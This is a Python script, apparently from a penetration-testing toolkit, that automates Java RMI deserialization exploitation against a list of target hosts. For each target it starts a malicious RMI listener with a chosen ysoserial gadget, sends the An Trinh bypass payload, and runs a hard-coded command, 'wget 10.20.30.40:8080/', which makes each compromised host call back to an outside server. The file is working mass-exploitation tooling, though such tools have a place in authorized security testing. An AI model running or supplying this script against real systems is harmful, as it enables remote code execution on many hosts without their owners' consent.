'''
Purpose:
multiple targets
single gadget

Use this to find how many hosts are vulnerable to a specific gadget deserialization
'''

import _common
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import time
import os
import argparse
import sys

parser = argparse.ArgumentParser(description="rmi automation - AnTrinh multiple target")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-i',metavar='"TARGET LIST"',type=str,required=True,help='Target IP or fqdn list file')

# Argomenti opzionali
OPTIONAL_ARGUMENTS.add_argument('--auto',action="store_true",help="Don't prompt the user to press enter to continue")
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ==============================================================================================================

if __name__ == '__main__':
    
    np.infoPrint("Choose java version to use:")
    lu.fancyPrint(_common.CONFIG['java-executables'])
    _common.CHOSEN_JAVA_VERSION = int(input("> ")) -1

    gadgets = fm.fileToSimpleList(_common.CONFIG["ysoserial-gadgets"])
    
    np.infoPrint("Choose YSoserial Gadget to use:")
    lu.fancyPrint(gadgets)
    gadget_choice = int(input("> ")) - 1

    targets = fm.fileToSimpleList(args.i)

    # CHANGE ME
    command = "wget 10.20.30.40:8080/"

    chosen_gadget = gadgets[gadget_choice]

    for t in targets:
        _common.RMGListen.start(chosen_gadget,command)
        time.sleep(1)

        targetValues = t.split(':')

        _common.RMGSerial.start_AnTrinh(targetIP=targetValues[0],targetPort=targetValues[1])
        time.sleep(1)

        
        if ('--auto' not in sys.argv):        
            np.infoPrint("Press enter to continue")
            input()
        else:
            np.infoPrint("Proceeding with next target...")
            time.sleep(1)

        _common.killXTerm()
        
